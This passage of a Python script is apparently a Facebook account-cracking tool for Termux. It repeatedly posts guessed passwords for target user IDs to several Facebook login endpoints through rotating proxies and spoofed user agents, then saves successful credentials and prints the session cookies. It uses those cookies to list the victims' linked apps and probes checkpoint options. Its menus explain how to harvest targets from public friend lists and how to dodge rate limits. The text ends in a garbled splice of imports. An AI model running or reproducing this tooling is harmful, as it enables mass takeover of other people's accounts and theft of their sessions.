			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v16.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'ASSqfFh8929p35Kn6/R+D8OSctQbVgiX+Pxpn8s5dImzlZcynOPPu9rnz5V0PKDXfbEwqT0VshbByU46SqsrXQ==','content-length': '332','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://developers.facebook.com/login/device-based/regular/login/?api_key=793139305026776&auth_token=0b6ec682004f184c19b735a0633758a7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&refsrc=deprecated&app_id=793139305026776&cancel=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE X ]-----------------#
def colmek1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://x.facebook.com/login.php?skip_api_login=1&api_key=123481471329046&kid_directed_site=0&app_id=123481471329046&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D123481471329046%26state%3D97cgz67n%26redirect_uri%3Dhttps%253A%252F%252Fplogin.jd.id%252Fcgi-bin%252Fmlogin%252Ffacebookcallback%26scope%3Demail%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7da29ea1-31ba-4b07-a30d-9fdafc8bfdd7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fplogin.jd.id%2Fcgi-bin%2Fmlogin%2Ffacebookcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D97cgz67n%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE D ]-----------------#
def colmek2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://d.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://d.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7720cbb3-6ccb-48be-8820-8775c6c7b67d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print(f'\r{K} *--> {idf} ◊ {pw}{N}')
					print(f"\r{K}      ╰─> {ua}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{H} *--> {idf} ◊ {pw}{N}')
					print(f"\r{H}      ╰─> {kuki}\n")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 12; CPH2089 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s    [+] Opsi CheckPoint :   %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s    [+] Tap Yes / A2F [ Cek Login Di Lite/Mbasic%s ]'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s   [+] %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s    [+] Tidak Dapat Mengecek Opsi [ Cek Login Di Lite/Mbasic ]%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

def var_menu():
    print('%s╔══[ %sSelect Method Login %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sLogin with Token'%(O,P,O,P))
    print('%s╠══[%s2%s] %sLogin with Cookies'%(O,P,O,P))
    print('%s╠══[%s3%s] %sScript Usage Tutorial'%(O,P,O,P))
    print('%s╠══[%s4%s] %sInfo Author & Team Project'%(O,P,O,P))
    print('%s╠══[%s0%s] %sGo Back'%(O,P,O,P))
def var_tutor():
    print('%s╔══[%s Tips & Tutorial %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sHow to Take Token'%(O,P,O,P))
    print('%s╠══[%s2%s] %sHow to Take Cookies'%(O,P,O,P))
    print('%s╠══[%s3%s] %sHow to Get Target'%(O,P,O,P))
    print('%s╠══[%s4%s] %sWays During the Crack Process'%(O,P,O,P))
def tutor_target():
    print('%s╠═══╦═══════════════════════════════════════════════════════════════╗'%(O))
    print('%s║ %s1 %s║ %sPrepare a Sacrificial Account In Chrome For Cracking Process %s ║'%(O,P,O,P,O))
    print('%s║ %s2 %s║ %sChange the Victim Account Password First                      %s║'%(O,P,O,P,O))
    print('%s║ %s3 %s║ %sFind Random Account Targets, Friends List Must Be Public      %s║'%(O,P,O,P,O))
    print('%s║ %s4 %s║ %sFriends (FL) Free, Can be 1K, 2K, 3K, ,4K, Or 5K              %s║'%(O,P,O,P,O))
    print('%s║ %s5 %s║ %sMore Friends, More Possible Results                           %s║'%(O,P,O,P,O))
    print('%s║ %s6 %s║ %sTap Target Profile/Cover Photo                                %s║'%(O,P,O,P,O))
    print('%s║ %s7 %s║ %ssee URL/Link Above, There is \ id = 10001xx\                  %s║'%(O,P,O,P,O))
    print('%s║ %s8 %s║ %sWell, thats a target ID ready to crack.                       %s║'%(O,P,O,P,O))
    print('%s║ %s9 %s║ %sOpen Termux/Linux then proceed to the Crack Process           %s║'%(O,P,O,P,O))
    print('%s╠═══╩═══════════════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(O))
def tutor_crack():
    print('%s╠═══╦════════════════════════════════════════════════════════════╗'%(O))
    print('%s║ %s1 %s║ %sMethod Api : Fast But Easy Process Spam                    %s║'%(O,P,O,P,O))
    print('%s║ %s2 %s║ %sMethod Mbasic : The process is quite fast, rarely spammed  %s║'%(O,P,O,P,O))
    print('%s║ %s3 %s║ %sMethod Mobile : Slow Process, Probably OK                  %s║'%(O,P,O,P,O))
    print('%s║ %s4 %s║ %sCrack Using Data Quota (Not Support Wifi)                  %s║'%(O,P,O,P,O))
    print('%s║ %s5 %s║ %sIf Results Do Not Appear While The Crack Is Running        %s║'%(O,P,O,P,O))
    print('%s║ %s6 %s║ %sTurn On Airplane Mode Only 5 Seconds                       %s║'%(O,P,O,P,O))
    print('%s╠═══╩════════════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(O))
def var_author():
    print('%s╔══[ %sAuthor & Team Project %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sAuthor :'%(O,P,O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║     • %sSPANTEK'%(O,P))
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(O,P,O,P,O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║     • %sPANTEK '%(O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║     • %sPANTEK'%(O,P))
    print('%s║'%(O))
def var_ugen():
    print("%s╠══[%s1%s] %sGet User Agent"%(O,P,O,P))
    print("%s╠══[%s2%s] %sChange User Agent%s(%sManual%s)"%(O,P,O,P,O,P,O))
    print("%s╠══[%s3%s] %sChange User Agent %s(%sAdjust HP%s)"%(O,P,O,P,O,P,O))
    print("%s╠══[%s4%s] %sDelete User Agent"%(O,P,O,P))
    print("%s╠══[%s5%s] %sCheck User Agent"%(O,P,O,P))
    print("%s╠══[%s0%s] %sReturn"%(O,P,O,P))
def start_method():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sMethod Api'%(O,P,O,P))
    print('%s╠══[%s2%s] %sMethod Mbasic'%(O,P,O,P))
    print('%s╠══[%s3%s] %sMethod Free FB'%(O,P,O,P))
    print('%s╠══[%sdll%s] %sDan Lain²'%(O,P,O,P))
def start_methodezz():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sFast Crack %s[%s6 pass%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s2%s] %sSlow Crack %s[%s9 pass%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s3%s] %sVery Slow Crack %s[%s12 pass%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s4%s] %sCrack Password Combine'%(O,P,O,P))
def started():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sCrack Is Running...'%(O,P,O,P))
    print('%s╠══[%s•%s] %sAccount [OK] Saved To OK/%s.txt'%(O,P,O,P,tgl))
    print('%s╠══[%s•%s] %sAccount [CP] Saved To CP/%s.txt'%(O,P,O,P,tgl))
    print('%s╚══[%s•%s] %sActivate Airplane Mode [5 Seconds Only] Every 5 Minutes\n'%(O,P,O,P))
#-----------------------[ DEF CEK OPSI ]--------------------#
def file_cp():
    import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
